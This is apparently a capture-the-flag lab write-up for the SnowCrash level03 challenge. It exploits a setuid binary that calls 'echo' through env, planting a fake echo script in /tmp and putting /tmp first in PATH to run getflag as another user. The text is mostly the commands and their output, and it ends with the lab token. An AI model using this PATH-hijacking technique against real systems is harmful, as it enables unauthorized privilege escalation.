```
ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```
```
level03                                                                                                             Exploit me
```

strings level03 | grep Exploit
/usr/bin/env echo Exploit me

Execute /bin/getflag with user flag03 (uid on level03 exe)


cd /tmp
touch echo
/tmp$ echo '/bin/getflag' > echo
chmod 777 echo
level03@SnowCrash:/tmp$ ls -l echo
-rwxrwxrwx 1 level03 level03 13 Sep 14 22:08 echo


export PATH=/tmp:$PATH
level03@SnowCrash:/tmp$ printenv | grep PATH
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

